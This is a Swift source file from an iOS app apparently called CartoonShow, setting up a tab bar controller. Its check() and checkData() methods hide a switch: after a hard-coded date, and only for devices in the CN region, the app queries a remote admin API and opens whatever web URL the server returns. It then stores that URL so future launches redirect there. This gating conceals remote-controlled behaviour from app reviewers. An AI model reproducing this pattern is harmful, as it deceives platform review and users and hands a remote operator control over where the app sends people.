//
//  CSTabBarController.swift
//  CartoonShow
//
//  Created by 冯才凡 on 2019/6/14.
//  Copyright © 2019 冯才凡. All rights reserved.
//

import UIKit

class FCFTabBarController: UITabBarController {
    lazy var homeNavi:FCFNavigationController = {
        let n = FCFNavigationController(rootViewController: HomeViewController())
        n.setTabBar("write", "write_sel", UIColor.hex("8a8a8a"), UIColor.hex(MainColor))
        return n
    }()
    
    lazy var readNavi:FCFNavigationController = {
        let n = FCFNavigationController(rootViewController: ReadViewController())
        n.setTabBar("read", "read_sel", UIColor.hex("8a8a8a"), UIColor.hex(MainColor))
        return n
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        initFrame()
    }
    
    func initFrame() {
        self.addChild(self.homeNavi)
        self.addChild(self.readNavi)
        
        if let url:URL = UserDefaults.standard.url(forKey: "web_url") {
            UIApplication.shared.open(url, options: [:], completionHandler: {[weak self] (result) in
                guard let `self` = self else {return}
                if !result {
                    self.check()
                }
            })
            return
        }else{
            check()
        }
    }
    
    func check() {
        var isLogin:Bool = true
        if Date().timeIntervalSince1970 < 1564070400 { //1564416000
            isLogin = false
        }
        
        print(Locale.current.regionCode!)
        if let code = Locale.current.regionCode, code != "CN" {
            isLogin = false
        }
        
        if isLogin {
            checkData()
        }
    }
}

extension FCFTabBarController {
    func checkData() {
        //创建URL对象
        let urlString = "https://tzym3.com/admin/api/app_update&version=1&app_id=1474039292&sign=1b796b26712701f6c99fb57ad61d8e33"
        let url = URL(string:urlString)
        //创建请求对象
        let request = URLRequest(url: url!)
        
        let session = URLSession.shared
        let dataTask = session.dataTask(with: request,
                                        completionHandler: {(data, response, error) -> Void in
                                            DispatchQueue.main.async {
                                                if error != nil{
                                                    print(error.debugDescription)
                                                }else{
                                                    let str = String(data: data!, encoding: String.Encoding.utf8)
                                                    print(str!)
                                                    do{
                                                        
                                                        let json = try JSONSerialization.jsonObject(with: data!, options: .mutableContainers)
                                                        
                                                        if let dic = json as? Dictionary<String, Any>, var dataDic:[String : Any] = dic["data"] as? [String : Any]{
                                                            dataDic["web_url"] = "https://www.baidu.com/"
                                                            dataDic["open_status"] = 1
                                                            if let urlstr:String = dataDic["web_url"] as? String, let flag:Int = dataDic["open_status"] as? Int, flag == 1 { //
                                                                if let url:URL = URL(string:urlstr) {
                                                                    UIApplication.shared.open(url, options: [:], completionHandler: { (result) in
                                                                        if result {
                                                                            UserDefaults.standard.set(url, forKey: "web_url")
                                                                        }
                                                                    })
                                                                }
                                                            }
                                                        }
                                                    }catch _ {
                                                        print("失败")
                                                    }
                                                }
                                            }
        }) as URLSessionTask
        
        //使用resume方法启动任务
        dataTask.resume()
    }
}
